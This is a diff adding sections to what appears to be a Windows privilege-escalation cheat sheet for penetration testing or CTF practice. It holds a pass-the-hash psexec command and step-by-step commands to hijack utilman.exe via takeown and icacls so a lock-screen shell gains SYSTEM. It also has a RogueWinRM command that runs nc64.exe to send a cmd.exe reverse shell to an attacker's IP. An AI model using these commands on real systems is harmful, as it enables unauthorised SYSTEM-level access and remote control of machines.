@@ -31,3 +31,27 @@
 #### python3 impacket-psexec.py -hashes HASH administrator@TARGET_IP
 
 #### TIP: We can also use evil-winrm for PtH attacks.
+
+## SeTakeOwnership
+
+#### Essentially, we can take ownership of a service running as SYSTEM and elevate privileges.
+
+### Example: Utilman.exe
+
+#### 1: takeown /f c:\windows\system32\utilman.exe
+
+#### 2: icacls c:\windows\system32\utilman.exe /grant USER:F
+
+#### 3: copy cmd.exe utilman.exe
+
+#### 4: Trigger uitlman : Lock screen, click ease of access
+
+## SeImpersonate/SeAssignPrimaryToken
+
+### A lot of potato exploits work with these privileges, so in our example we will stalk about RoguePotato.
+
+#### RogueWinRM.exe exploit
+
+#### 1: Start listener
+
+#### c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"
